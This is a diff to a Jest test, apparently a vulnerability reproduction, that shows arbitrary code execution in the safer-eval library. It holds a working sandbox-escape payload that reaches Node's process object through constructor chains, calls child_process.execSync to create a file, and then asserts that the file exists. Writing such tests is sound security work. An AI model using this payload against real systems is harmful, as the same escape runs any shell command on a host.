@@ -1,11 +1,20 @@
 test("Arbitrary code execution in safer-eval", () => {
+  const fs = require("fs");
+  const path = "./safer-eval";
+
   expect.assertions(2);
+  try {
+      fs.unlinkSync(path, function (err) {});
+  } catch (error) {}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
   const saferEval = require("safer-eval");
-  expect({}.polluted).toBe(undefined);
   try {
     saferEval(
-      "console.constructor.constructor('return 1+(Object.prototype.polluted=`yes`)')().env"
+      `console.constructor.constructor('return 1+(import("test").catch((e)=>{})["constructor"]["constructor"]("return process")().mainModule.require("child_process").execSync("touch ${path}"))')().env`
     );
-  } catch (error) {}
-  expect({}.polluted).toBe("yes");
+  } catch (error) {console.log(error)}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
 });
